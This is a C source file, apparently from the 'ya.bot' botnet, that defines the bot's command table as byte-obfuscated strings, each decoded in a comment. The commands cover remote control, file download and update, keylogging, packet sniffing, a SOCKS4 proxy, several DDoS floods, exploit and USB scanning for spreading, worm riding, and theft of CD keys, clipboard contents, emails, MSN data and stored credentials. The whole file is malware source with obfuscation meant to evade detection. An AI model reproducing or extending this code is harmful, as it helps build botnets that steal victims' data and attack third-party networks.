/*  ya.bot  */

const char *cmd_botlogin = //bot.login
		"\xAB\xA6\xBD\xE7\xA5\xA6\xAE\xA0\xA7";
const char *cmd_botdie = //bot.die
		"\xAB\xA6\xBD\xE7\xAD\xA0\xAC";
const char *cmd_botdisconnect = //bot.disconnect
		"\xAB\xA6\xBD\xE7\xAD\xA0\xBA\xAA\xA6\xA7\xA7\xAC\xAA\xBD";
const char *cmd_botdns = //bot.dns
		"\xAB\xA6\xBD\xE7\xAD\xA7\xBA";
const char *cmd_botinfo = //bot.info
		"\xAB\xA6\xBD\xE7\xA0\xA7\xAF\xA6";
const char *cmd_botlogout = //bot.logout
		"\xAB\xA6\xBD\xE7\xA5\xA6\xAE\xA6\xBC\xBD";
const char *cmd_botraw = //bot.raw
		"\xAB\xA6\xBD\xE7\xBB\xA8\xBE";
const char *cmd_botremove = //bot.remove
		"\xAB\xA6\xBD\xE7\xBB\xAC\xA4\xA6\xBF\xAC";
const char *cmd_botsystem = //bot.system
		"\xAB\xA6\xBD\xE7\xBA\xB0\xBA\xBD\xAC\xA4";

#ifndef NO_DCC
const char *cmd_dccsend = //dcc.send
		"\xAD\xAA\xAA\xE7\xBA\xAC\xA7\xAD";
const char *cmd_dccstop = //dcc.stop
		"\xAD\xAA\xAA\xE7\xBA\xBD\xA6\xB9";
#endif

const char *cmd_filedelete = //file.delete
		"\xAF\xA0\xA5\xAC\xE7\xAD\xAC\xA5\xAC\xBD\xAC";
#ifndef NO_FILEFIND
const char *cmd_filefind = //file.find
		"\xAF\xA0\xA5\xAC\xE7\xAF\xA0\xA7\xAD";
#endif
const char *cmd_fileopen = //file.open
		"\xAF\xA0\xA5\xAC\xE7\xA6\xB9\xAC\xA7";

#ifndef NO_FTP
const char *cmd_ftpdownload = //ftp.download
		"\xAF\xBD\xB9\xE7\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD";
const char *cmd_ftpupdate = //ftp.update
		"\xAF\xBD\xB9\xE7\xBC\xB9\xAD\xA8\xBD\xAC";
const char *cmd_ftpupload = //ftp.upload
		"\xAF\xBD\xB9\xE7\xBC\xB9\xA5\xA6\xA8\xAD";
#endif

#ifndef NO_HTTP
const char *cmd_httpdownload = //http.download
		"\xA1\xBD\xBD\xB9\xE7\xAD\xA6\xBE\xA7\xA5\xA6\xA8\xAD";
const char *cmd_httpupdate = //http.update
		"\xA1\xBD\xBD\xB9\xE7\xBC\xB9\xAD\xA8\xBD\xAC";
const char *cmd_httpvisit = //http.visit
		"\xA1\xBD\xBD\xB9\xE7\xBF\xA0\xBA\xA0\xBD";
#endif

#ifndef NO_INFO
const char *cmd_infonet = //info.net
		"\xA0\xA7\xAF\xA6\xE7\xA7\xAC\xBD";
const char *cmd_infosys = //info.sys
		"\xA0\xA7\xAF\xA6\xE7\xBA\xB0\xBA";
#endif

#ifndef NO_KEYLOG
const char *cmd_keylogsign = //keylog.sign
		"\xA2\xAC\xB0\xA5\xA6\xAE\xE7\xBA\xA0\xAE\xA7";
const char *cmd_keylogstart = //keylog.start
		"\xA2\xAC\xB0\xA5\xA6\xAE\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_keylogstop = //keylog.stop
		"\xA2\xAC\xB0\xA5\xA6\xAE\xE7\xBA\xBD\xA6\xB9";
#endif

#ifndef NO_LOGIC
const char *cmd_logicif = //logic.if
		"\xA5\xA6\xAE\xA0\xAA\xE7\xA0\xAF";
#endif

const char *cmd_processkillpid = //process.killpid
		"\xB9\xBB\xA6\xAA\xAC\xBA\xBA\xE7\xA2\xA0\xA5\xA5\xB9\xA0\xAD";
const char *cmd_processlist = //process.list
		"\xB9\xBB\xA6\xAA\xAC\xBA\xBA\xE7\xA5\xA0\xBA\xBD";
const char *cmd_processtart = //process.start
		"\xB9\xBB\xA6\xAA\xAC\xBA\xBA\xE7\xBA\xBD\xA8\xBB\xBD";

#ifndef NO_PSNIFF
const char *cmd_psniffstart = //psniff.start
		"\xB9\xBA\xA7\xA0\xAF\xAF\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_psniffstop = //psniff.stop
		"\xB9\xBA\xA7\xA0\xAF\xAF\xE7\xBA\xBD\xA6\xB9";
#endif

#ifndef NO_SPEEDTEST
const char *cmd_speedtesthttp = //speedtest.http
		"\xBA\xB9\xAC\xAC\xAD\xBD\xAC\xBA\xBD\xE7\xA1\xBD\xBD\xB9";
#endif

const char *cmd_threadkill = //thread.kill
		"\xBD\xA1\xBB\xAC\xA8\xAD\xE7\xA2\xA0\xA5\xA5";
const char *cmd_threadlist = //thread.list
		"\xBD\xA1\xBB\xAC\xA8\xAD\xE7\xA5\xA0\xBA\xBD";

#ifndef NO_DAEMONSOCKS4
const char *cmd_socks4dstart = //socks4d.start
		"\xBA\xA6\xAA\xA2\xBA\xFD\xAD\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_socks4dstop = //socks4d.stop
		"\xBA\xA6\xAA\xA2\xBA\xFD\xAD\xE7\xBA\xBD\xA6\xB9";
#endif

#ifndef NO_BANDWITHFLOOD
const char *cmd_ddosbandwith = //ddos.bandwith
		"\xAD\xAD\xA6\xBA\xE7\xAB\xA8\xA7\xAD\xBE\xA0\xBD\xA1";
#endif
const char *cmd_ddosstop = //ddos.stop
		"\xAD\xAD\xA6\xBA\xE7\xBA\xBD\xA6\xB9";
#ifndef NO_SYNACKFLOOD
const char *cmd_ddossynack = //ddos.synack
		"\xAD\xAD\xA6\xBA\xE7\xBA\xB0\xA7\xA8\xAA\xA2";
#endif
#ifndef NO_TROLLFLOOD
const char *cmd_ddostroll = //ddos.troll
		"\xAD\xAD\xA6\xBA\xE7\xBD\xBB\xA6\xA5\xA5";
#endif
#ifndef NO_UDPKFLOOD
const char *cmd_ddosudp = //ddos.udp
		"\xAD\xAD\xA6\xBA\xE7\xBC\xAD\xB9";
#endif

#ifndef NO_BOTKILLER
const char *cmd_botkillerstart = //botkiller.start
		"\xAB\xA6\xBD\xA2\xA0\xA5\xA5\xAC\xBB\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_botkillerstop = //botkiller.stop
		"\xAB\xA6\xBD\xA2\xA0\xA5\xA5\xAC\xBB\xE7\xBA\xBD\xA6\xB9";
#endif

#ifndef NO_EXPSCAN
const char *cmd_expscancip = //expscan.cip
		"\xAC\xB1\xB9\xBA\xAA\xA8\xA7\xE7\xAA\xA0\xB9";
const char *cmd_expscanstart = //expscan.start
		"\xAC\xB1\xB9\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_expscanstop = //expscan.stop
		"\xAC\xB1\xB9\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA6\xB9";
#endif
#ifndef NO_MIRCSCAN
const char *cmd_mircscanstart = //mircscan.start
		"\xA4\xA0\xBB\xAA\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_mircscanstop = //mircscan.stop
		"\xA4\xA0\xBB\xAA\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA6\xB9";
#endif
#ifndef NO_USBSCAN
const char *cmd_usbscanstart = //usbscan.start
		"\xBC\xBA\xAB\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_usbscanstop = //usbscan.stop
		"\xBC\xBA\xAB\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA6\xB9";
#endif
const char *cmd_scanstats = //scan.stats
		"\xBA\xAA\xA8\xA7\xE7\xBA\xBD\xA8\xBD\xBA";

const char *cmd_snagall = //snag.all
		"\xBA\xA7\xA8\xAE\xE7\xA8\xA5\xA5";
#ifndef NO_SNAGCDKEYS
const char *cmd_snagcdkeys = //snag.cdkeys
		"\xBA\xA7\xA8\xAE\xE7\xAA\xAD\xA2\xAC\xB0\xBA";
#endif
#ifndef NO_SNAGCLIPBOARD
const char *cmd_snagclipboard = //snag.clipboard
		"\xBA\xA7\xA8\xAE\xE7\xAA\xA5\xA0\xB9\xAB\xA6\xA8\xBB\xAD";
#endif
#ifndef NO_SNAGEMAILS
const char *cmd_snagemails = //snag.emails
		"\xBA\xA7\xA8\xAE\xE7\xAC\xA4\xA8\xA0\xA5\xBA";
#endif
#ifndef NO_SNAGMSN
const char *cmd_snagmsn = //snag.msn
		"\xBA\xA7\xA8\xAE\xE7\xA4\xBA\xA7";
#endif
#ifndef NO_SNAGSTORAGE
const char *cmd_snagstorage = //snag.storage
		"\xBA\xA7\xA8\xAE\xE7\xBA\xBD\xA6\xBB\xA8\xAE\xAC";
#endif

#ifndef NO_INSTALLWORMRIDE
const char *cmd_wormridestart = //wormride.start
		"\xBE\xA6\xBB\xA4\xBB\xA0\xAD\xAC\xE7\xBA\xBD\xA8\xBB\xBD";
const char *cmd_wormridestop = //wormride.stop
		"\xBE\xA6\xBB\xA4\xBB\xA0\xAD\xAC\xE7\xBA\xBD\xA6\xB9";
#endif